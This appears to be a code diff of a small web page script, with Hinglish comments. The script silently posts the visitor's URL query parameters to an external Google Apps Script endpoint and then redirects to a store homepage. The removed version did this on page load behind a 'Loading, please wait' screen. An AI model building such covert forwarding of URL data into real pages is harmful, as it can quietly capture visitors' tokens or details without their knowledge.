@@ -1,57 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing...</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            margin: 0;
-        }
-        .loader {
-            font-size: 16px;
-            color: #666666;
-        }
-    </style>
-</head>
-<body>
+<script>
+    // Aapka exact Google Script URL jo screenshot me upar browser bar me dikh raha hai
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxVeOVwQIeqpP9HQfhgVY2UMiBAgM0yghjnDY9vpN-tlhpoPqTBN0-eXvM1ojLGWOaW/exec";
+    
+    // Woh link jahan redirect karna hai (Aapka target home page)
+    const REDIRECT_URL = "https://m.pete-store.com/home";
 
-    <div class="loader">Loading, please wait...</div>
-
-    <script>
-        // 1. Aapka Google Script URL
-        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxVeOVwQIeqpP9HQfhgVY2UMiBAgM0yghjnDY9vpN-tlhpoPqTBN0-eXvM1ojLGWOaW/exec";
+    // Jab dashboard par koi action/submit ho ya aapko auto-redirect karna ho:
+    function handleSecureRedirect() {
+        const urlParams = new URLSearchParams(window.location.search);
         
-        // 2. Target Redirect URL
-        const REDIRECT_URL = "https://m.pete-store.com/home";
+        fetch(WEB_APP_URL, {
+            method: 'POST',
+            mode: 'no-cors', 
+            keepalive: true,
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: urlParams.toString()
+        });
 
-        function sendAndRedirect() {
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            // keepalive: true lagane se background request chalti rahegi aur popup trigger nahi hoga
-            fetch(WEB_APP_URL, {
-                method: 'POST',
-                mode: 'no-cors', 
-                keepalive: true,
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: urlParams.toString()
-            });
-
-            // Kisi popup window open karne ke tarike (.open()) ka use nahi kiya hai
-            // window.location.replace se tab ke andar hi seedha content badal jata hai (no popup blocker trigger)
-            window.location.replace(REDIRECT_URL);
-        }
-
-        // Page load hote hi instant execution
-        window.onload = sendAndRedirect;
-    </script>
-</body>
-</html>
+        // Yeh browser ke popup blocker ko bypass karke usi tab me open karega
+        window.location.replace(REDIRECT_URL);
+    }
+</script>
